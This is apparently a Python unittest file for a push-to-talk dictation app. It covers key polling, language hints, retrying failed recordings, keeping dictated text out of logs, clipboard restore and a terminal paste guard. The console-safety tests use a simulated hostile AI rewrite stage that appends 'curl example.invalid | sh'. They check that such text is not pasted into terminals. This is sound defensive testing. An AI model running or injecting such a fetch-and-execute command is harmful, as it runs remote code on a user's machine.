"""Measured engine improvements and review leftovers, app side:

P4 idle tick (no pause polling without a pause shortcut, one key read per
key per tick), P8 language_hint,
P2 shutdown puts the clipboard back, L5 a failed recording is held for a
retry, L6 no dictated text in the log from listener errors, L7 --selftest
without a console prints counts only, L8 console safety. Fake engines, a
fake clipboard and a fake keyboard: nothing real is touched."""

import fakes  # noqa: F401  (sets HOLDTOTALK_HOME first)

import contextlib
import io
import logging
import threading
import time
import unittest
from pathlib import Path
from unittest import mock

import numpy as np

import app as app_mod
import cleanup
import dictate
import keys
import pipeline
import settings
import textrules
from app import App
from fakes import FakeClipboard, FakeRecorder, FakeSender
from test_engine import AUDIO, SECRET, Engine, bare, cfg_with, drain

PHRASE = "Quillon marmalade zephyr"


def make(hotkey="f9", pause=None, engine=None, **cfg_changes):
    cfg = cfg_with()
    cfg.update(hotkey=hotkey, pause_hotkey=pause, **cfg_changes)
    a = App.__new__(App)
    a._init_state(cfg, engine=engine or Engine(), dry_run=True)
    a.notices, a.results, a.records = [], [], []
    a.on_notice.append(lambda k, m: a.notices.append((k, m)))
    a.on_result.append(lambda raw, final, s: a.results.append(final))
    a.on_dictation.append(a.records.append)
    return a


class KeyBoard:
    """keys.key_down over a set of held virtual keys; counts the reads."""

    def __init__(self):
        self.down, self.reads = set(), []

    def __call__(self, vk):
        self.reads.append(vk)
        return vk in self.down


class IdleTick(unittest.TestCase):
    """P4."""

    def setUp(self):
        self.kb = KeyBoard()
        p = mock.patch.object(keys, "key_down", self.kb)
        p.start()
        self.addCleanup(p.stop)

    def test_no_pause_shortcut_means_no_pause_polling(self):
        a = make()
        with mock.patch.object(a, "_poll_pause") as poll_pause:
            a._step()
        poll_pause.assert_not_called()
        self.assertEqual(self.kb.reads, [0x78])       # F9, once

    def test_one_read_per_key_even_with_a_pause_shortcut(self):
        a = make(hotkey="ctrl+windows", pause="ctrl+alt+p")
        self.kb.reads.clear()
        a._step()
        self.assertEqual(self.kb.reads, [0x11])       # Ctrl, once, not twice

    def test_the_cache_lives_for_one_tick_only(self):
        a = make(hotkey="ctrl+windows", pause="ctrl+alt+p")
        self.kb.reads.clear()
        a._step()
        a._step()
        self.assertEqual(self.kb.reads, [0x11, 0x11])
        self.assertIsNone(a._tick_keys)

    def test_the_pause_shortcut_still_works(self):
        a = make(pause="f10")
        a._step()
        self.assertFalse(a.paused)
        self.kb.down = {0x79}                         # F10
        a._step()
        self.assertTrue(a.paused)
        a._step()                                     # still held: no toggle
        self.assertTrue(a.paused)

    def test_the_hotkey_still_starts_and_ends_a_recording(self):
        a = make()
        a.recorder = FakeRecorder()
        self.kb.down = {0x78}
        a._step()
        self.assertEqual(a._state, "recording")
        self.kb.down = set()
        a._step()
        self.assertEqual(a._state, "idle")
        self.assertEqual(a._jobs.qsize(), 1)

    def test_a_mouse_hotkey_builds_its_hook_request_once(self):
        a = make(hotkey="mouse4")
        a.status = "ready"
        self.assertIs(a._hook_wanted(), a._hook_wanted())
        self.assertEqual(a._hook_wanted()[0], "hotkey")


class LanguageEngine(Engine):
    def __init__(self, language="de", probability=0.97, **kw):
        super().__init__(**kw)
        self.last_language, self.last_language_probability = (language,
                                                              probability)


class LanguageHint(unittest.TestCase):
    """P8."""

    def dictate(self, a, n):
        for _ in range(n):
            a._process(("audio", AUDIO))
        drain(a)

    def test_ten_in_a_row_in_one_language_make_a_hint(self):
        a = make(engine=LanguageEngine())
        self.dictate(a, 9)
        self.assertIsNone(a.language_hint)
        self.dictate(a, 1)
        self.assertEqual(a.language_hint, "de")

    def test_one_other_language_breaks_it_for_ten_dictations(self):
        a = make(engine=LanguageEngine())
        self.dictate(a, 10)
        a.engine.last_language = "en"
        self.dictate(a, 1)
        self.assertIsNone(a.language_hint)
        a.engine.last_language = "de"
        self.dictate(a, 9)
        self.assertIsNone(a.language_hint)       # the "en" is still in it
        self.dictate(a, 1)
        self.assertEqual(a.language_hint, "de")

    def test_a_weak_detection_prevents_it(self):
        a = make(engine=LanguageEngine(probability=0.97))
        self.dictate(a, 9)
        a.engine.last_language_probability = 0.6
        self.dictate(a, 1)
        self.assertIsNone(a.language_hint)
        b = make(engine=LanguageEngine(probability=None))    # unknown
        self.dictate(b, 10)
        self.assertIsNone(b.language_hint)

    def test_no_hint_while_a_language_is_chosen(self):
        a = make(engine=LanguageEngine(), language="de")
        self.dictate(a, 12)
        self.assertIsNone(a.language_hint)
        a.cfg["language"] = None
        self.assertIsNone(a.language_hint)       # nothing was collected

    def test_choosing_a_language_forgets_the_history(self):
        a = make(engine=LanguageEngine())
        self.dictate(a, 10)
        self.assertEqual(a.language_hint, "de")
        a.cfg["language"] = "de"
        self.assertIsNone(a.language_hint)
        self.dictate(a, 1)                       # a dictation with it set
        a.cfg["language"] = None
        self.assertIsNone(a.language_hint)

    def test_a_text_job_adds_nothing(self):
        a = make(engine=LanguageEngine())
        for _ in range(10):
            a._process(("text", "hello there", 1.0))
        self.assertIsNone(a.language_hint)


class HeldRecording(unittest.TestCase):
    """L5."""

    def setUp(self):
        for target in ("wave.open", "numpy.save"):
            p = mock.patch(target, side_effect=AssertionError("disk"))
            p.start()
            self.addCleanup(p.stop)

    def failing(self):
        plan = {"fails": 99, "seen": []}
        a = make(engine=Engine(plan=plan, device="cpu"))
        a._factory = lambda: Engine(plan=plan, device="cpu")
        return a, plan

    def give_up(self, a, samples=AUDIO):
        with self.assertLogs("holdtotalk.app", "ERROR"):
            a._process(("audio", samples))
        drain(a)

    def test_the_failed_recording_is_held_and_the_notice_says_so(self):
        a, _ = self.failing()
        self.assertIsNone(a.held_recording)
        self.give_up(a)
        held = a.held_recording
        self.assertEqual(held["seconds"], 1.0)
        self.assertGreater(held["expires_in"], 200)
        text = " ".join(m for k, m in a.notices if k == "error")
        self.assertIn("kept", text)
        self.assertNotIn("dropped", text)

    def test_retry_engine_transcribes_it_once_the_model_is_back(self):
        a, plan = self.failing()
        self.give_up(a)
        self.assertEqual(a.results, [])
        plan["fails"] = 0
        self.assertTrue(a.retry_engine())
        a.loader_thread.join(5)
        drain(a)
        self.assertEqual(a.status, "ready")
        self.assertIsNone(a.held_recording)           # handed to the worker
        job = a._jobs.get_nowait()
        self.assertEqual(job[0], "audio")
        a._process(job)
        drain(a)
        self.assertEqual(len(a.results), 1)           # transcribed once
        self.assertIsNone(a.held_recording)

    def test_a_new_method_does_the_same_for_the_window(self):
        a, plan = self.failing()
        self.give_up(a)
        self.assertFalse(a.retry_held_recording())    # model still broken
        self.assertIsNotNone(a.held_recording)        # and nothing was lost
        plan["fails"] = 0
        a.retry_engine()
        a.loader_thread.join(5)
        drain(a)
        self.assertFalse(a.retry_held_recording())    # already queued
        self.assertEqual(a._jobs.qsize(), 1)

    def test_it_is_held_again_if_the_retry_fails_too(self):
        a, plan = self.failing()
        self.give_up(a)
        a.status = "ready"
        a._engine_ready.set()
        a.engine = Engine(plan=plan, device="cpu")
        self.assertTrue(a.retry_held_recording())
        self.assertIsNone(a.held_recording)
        self.give_up_job(a)
        self.assertIsNotNone(a.held_recording)

    def give_up_job(self, a):
        job = a._jobs.get_nowait()
        with self.assertLogs("holdtotalk.app", "ERROR"):
            a._process(job)
        drain(a)

    def test_only_the_most_recent_failure_is_kept(self):
        a, _ = self.failing()
        self.give_up(a, np.full(16000, 0.1, dtype=np.float32))
        self.give_up(a, np.full(32000, 0.1, dtype=np.float32))
        self.assertEqual(a.held_recording["seconds"], 2.0)

    def test_it_expires(self):
        a, _ = self.failing()
        self.give_up(a)
        a._held = (a._held[0], time.monotonic() - 1)
        self.assertIsNone(a.held_recording)
        self.assertIsNone(a._held)                    # the audio is gone
        self.assertFalse(a.retry_held_recording())

    def test_the_tick_clears_an_expired_one_by_itself(self):
        a, _ = self.failing()
        self.give_up(a)
        a._held = (a._held[0], time.monotonic() - 1)
        with mock.patch.object(keys, "key_down", lambda vk: False):
            a._step()
        self.assertIsNone(a._held)

    def test_quitting_clears_it(self):
        a, _ = self.failing()
        self.give_up(a)
        a.overlay, a.root, a.recorder = mock.Mock(), mock.Mock(), mock.Mock()
        a._shutdown()
        self.assertIsNone(a.held_recording)
        self.assertIsNone(a._held)

    def test_a_dropped_recording_while_the_model_is_down_is_held(self):
        a, _ = self.failing()
        a.status = "failed"
        a._engine_ready.clear()
        a._pending = 1
        a._jobs.put(("audio", AUDIO))
        a._jobs.put(None)
        with self.assertLogs("holdtotalk.app", "ERROR"):
            a._worker()
        drain(a)
        self.assertIsNotNone(a.held_recording)
        text = " ".join(m for k, m in a.notices if k == "dropped")
        self.assertIn("kept", text)

    def test_a_success_never_holds_anything(self):
        a = make()
        a._process(("audio", AUDIO))
        self.assertIsNone(a.held_recording)


def capture_log(fn):
    """Everything logged (any logger, any level) while fn() runs."""
    lines = []

    class Handler(logging.Handler):
        def emit(self, record):
            lines.append(logging.Formatter("%(message)s").format(record))
            if record.exc_info:
                lines.append(logging.Formatter().formatException(
                    record.exc_info))
    handler, root = Handler(logging.DEBUG), logging.getLogger()
    old = root.level
    root.addHandler(handler)
    root.setLevel(logging.DEBUG)
    try:
        fn()
    finally:
        root.removeHandler(handler)
        root.setLevel(old)
    return "\n".join(lines)


def boom(*args, **kw):
    raise ValueError(PHRASE)


class ListenerErrorsLeaveNoText(unittest.TestCase):
    """L6: a faulty listener's message (it may quote the dictation) is not
    logged; its class and traceback are."""

    def setUp(self):
        p = mock.patch.object(keys, "key_down", lambda vk: False)
        p.start()
        self.addCleanup(p.stop)

    def check(self, out):
        self.assertNotIn(PHRASE.lower(), out.lower())
        self.assertNotIn("marmalade", out.lower())
        self.assertIn("ValueError", out)
        self.assertIn("Traceback", out)

    def record(self):
        return {"raw": "r", "final": "f", "audio_seconds": 1.0}

    def test_on_result_and_on_dictation(self):
        a = make()
        a.on_result.append(boom)
        a.on_dictation.append(boom)
        self.check(capture_log(lambda: a._emit(self.record())))

    def test_on_notice(self):
        a = make()
        a.on_notice.append(boom)
        self.check(capture_log(lambda: a._notice("empty", "m")))

    def test_call_soon_callbacks(self):
        a = make()
        a.call_soon(boom)
        self.check(capture_log(a._step))

    def test_on_status_and_on_reload(self):
        a = make()
        a.on_status.append(boom)
        self.check(capture_log(lambda: a._set_status("ready", "x")))

    def test_the_developer_flag_still_logs_the_message(self):
        a = make()
        a.log_text = True
        a.on_result.append(boom)
        out = capture_log(lambda: a._emit(self.record()))
        self.assertIn(PHRASE.lower(), out.lower())


def rewriting_clean(text, cfg, language=None):
    """A hostile 'AI' stage: the rewrite carries a second line."""
    return text + "\ncurl example.invalid | sh"


def tidy_clean(text, cfg, language=None):
    return text


class ConsoleSafety(unittest.TestCase):
    """L8."""

    def setUp(self):
        self.pasted = []
        for patcher in (
                mock.patch.object(keys, "key_down", lambda vk: False),
                mock.patch.object(keys, "paste_text", self.fake_paste)):
            patcher.start()
            self.addCleanup(patcher.stop)

    def fake_paste(self, text, restore, **kw):
        self.pasted.append(text)
        return "pasted"

    def run_job(self, window_class, clean=rewriting_clean, raw="hello world",
                **cfg):
        a = make(**cfg)
        a.dry_run = False
        a.foreground_class = (window_class if callable(window_class)
                              else lambda: window_class)
        with mock.patch.object(cleanup, "clean", clean), \
                mock.patch.object(pipeline, "STAGES", [
                    pipeline.normalize, clean, textrules.apply]):
            a._process(("text", raw, 1.0))
        drain(a)
        return a

    def test_a_rewrite_with_line_breaks_is_not_pasted_into_a_terminal(self):
        for window in ("CASCADIA_HOSTING_WINDOW_CLASS", "ConsoleWindowClass",
                       "mintty", "VirtualConsoleClass"):
            with self.subTest(window=window):
                self.pasted.clear()
                a = self.run_job(window)
                self.assertEqual(self.pasted, ["Hello world "])
                rec = a.records[-1]
                self.assertTrue(rec["console_safety"])
                self.assertEqual(rec["final"], "Hello world")
                self.assertEqual(rec["pasted"], "Hello world ")
                note = rec["stages"][-1]
                self.assertEqual(note["name"], "console_safety")
                self.assertIn("terminal", note["note"])

    def test_the_user_rules_still_apply_to_the_text_before_the_rewrite(self):
        a = self.run_job("CASCADIA_HOSTING_WINDOW_CLASS", raw="ask jason",
                         dictionary=[{"heard": "jason", "wanted": "JSON"}])
        self.assertEqual(self.pasted, ["Ask JSON "])
        self.assertEqual(a.records[-1]["final"], "Ask JSON")

    def test_other_windows_get_the_rewrite(self):
        a = self.run_job("Notepad")
        self.assertEqual(self.pasted, ["Hello world\ncurl example.invalid | sh "])
        self.assertFalse(a.records[-1]["console_safety"])
        self.assertNotIn("console_safety",
                         [s["name"] for s in a.records[-1]["stages"]])

    def test_a_rewrite_without_new_line_breaks_is_pasted_everywhere(self):
        a = self.run_job("CASCADIA_HOSTING_WINDOW_CLASS", clean=tidy_clean)
        self.assertEqual(self.pasted, ["Hello world "])
        self.assertFalse(a.records[-1]["console_safety"])

    def test_line_breaks_from_the_users_snippets_are_their_intent(self):
        a = self.run_job("CASCADIA_HOSTING_WINDOW_CLASS", clean=tidy_clean,
                         raw="my address", snippets=[
                             {"trigger": "my address",
                              "text": "1 Example Street\nExampleville"}])
        self.assertEqual(len(self.pasted), 1)
        self.assertIn("\n", self.pasted[0])
        self.assertFalse(a.records[-1]["console_safety"])

    def test_line_breaks_the_text_already_had_do_not_count(self):
        # Present before the rewrite, no more of them afterwards.
        def same_breaks(text, cfg, language=None):
            return text.replace("one two", "one\ntwo")
        a = self.run_job("CASCADIA_HOSTING_WINDOW_CLASS", clean=same_breaks,
                         raw="one\ntwo")
        self.assertFalse(a.records[-1]["console_safety"])

    def test_an_unknown_foreground_window_is_treated_with_care(self):
        def broken():
            raise OSError("no window")
        a = self.run_job(broken)
        self.assertEqual(self.pasted, ["Hello world "])
        self.assertTrue(a.records[-1]["console_safety"])

    def test_the_window_is_looked_at_when_pasting_not_before(self):
        order = []
        a = make()
        a.dry_run = False
        a.foreground_class = lambda: order.append("window") or \
            "ConsoleWindowClass"
        busy = iter([True, True, False])         # a recording, then free

        def keyboard_busy():
            order.append("busy")
            return next(busy)
        a._keyboard_busy = keyboard_busy
        note = {}
        with mock.patch.object(time, "sleep", lambda s: None):
            a._deliver("rewritten\n", True, ("plain", "plain "), note)
        self.assertEqual(order, ["busy", "busy", "busy", "window"])
        self.assertEqual(self.pasted, ["plain "])
        self.assertEqual(note, {"final": "plain", "text": "plain "})

    def test_the_default_foreground_probe_returns_text(self):
        self.assertIsInstance(app_mod._foreground_class(), str)

    def test_the_console_list(self):
        for name in ("ConsoleWindowClass", "CASCADIA_HOSTING_WINDOW_CLASS"):
            self.assertIn(name, app_mod.CONSOLE_CLASSES)


class ShutdownRestoresTheClipboard(unittest.TestCase):
    """P2: quitting with a restore still pending puts the clipboard back."""

    def test_shutdown_restores_before_exit(self):
        before = [(keys.CF_UNICODETEXT, "", "mine\0".encode("utf-16-le"))]
        cb = FakeClipboard(before)
        timers = []
        keys.restore_pending_clipboard()
        keys.paste_text("temporary", True, clipboard=cb, sender=FakeSender(),
                        ready=lambda: True, sleep=lambda s: None,
                        schedule=lambda d, fn: timers.append(fn) or mock.Mock())
        self.assertIn(keys.text_items("temporary")[0], cb.items)
        a = make()
        a.overlay, a.root, a.recorder = mock.Mock(), mock.Mock(), mock.Mock()
        a._shutdown()
        self.assertEqual([i for i in cb.items if i[1] == ""], before)


class SelftestWithoutAConsole(unittest.TestCase):
    """L7."""

    WORDS = "alpha bravo charlie delta"

    def run_selftest(self, windowless, log_text):
        class FakeEngine:
            device, name, compute_type = "cpu", "m", "int8"

            def __init__(self, cfg):
                pass

            def transcribe(self, samples):
                return PHRASE

        out = io.StringIO()
        with mock.patch("stt.Engine", FakeEngine), \
                mock.patch("audio.read_wav",
                           lambda path: np.zeros(16000, dtype=np.float32)), \
                contextlib.redirect_stdout(out):
            dictate.cmd_selftest(cfg_with(), "x.wav", windowless, log_text)
        return out.getvalue()

    def test_windowless_prints_counts_only(self):
        out = self.run_selftest(windowless=True, log_text=False)
        self.assertNotIn(PHRASE.lower(), out.lower())
        self.assertNotIn("marmalade", out.lower())
        self.assertIn("words", out)
        self.assertIn("--log-text", out)

    def test_windowless_with_the_flag_prints_the_text(self):
        out = self.run_selftest(windowless=True, log_text=True)
        self.assertIn(PHRASE.lower(), out.lower())

    def test_with_a_console_it_prints_the_text(self):
        out = self.run_selftest(windowless=False, log_text=False)
        self.assertIn(PHRASE.lower(), out.lower())

    def test_main_passes_both_facts_on(self):
        tmp = Path(fakes_home()) / "selftest-main"
        tmp.mkdir(exist_ok=True)
        saved = (settings.CONFIG_PATH, settings.HISTORY_PATH,
                 settings.LOG_PATH, settings.DATA_DIR)
        try:
            with mock.patch.object(dictate, "_prepare_streams",
                                   return_value=True), \
                    mock.patch.object(dictate, "_setup_logging"), \
                    mock.patch.object(dictate, "cmd_selftest",
                                      return_value=0) as selftest:
                dictate.main(["--selftest", "a.wav", "--config",
                              str(tmp / "c.json"), "--log-text"])
                dictate.main(["--selftest", "a.wav", "--config",
                              str(tmp / "c.json")])
        finally:
            (settings.CONFIG_PATH, settings.HISTORY_PATH, settings.LOG_PATH,
             settings.DATA_DIR) = saved
        self.assertEqual([c.args[2:] for c in selftest.call_args_list],
                         [(True, True), (True, False)])


def fakes_home():
    import os
    return os.environ["HOLDTOTALK_HOME"]


if __name__ == "__main__":
    unittest.main()
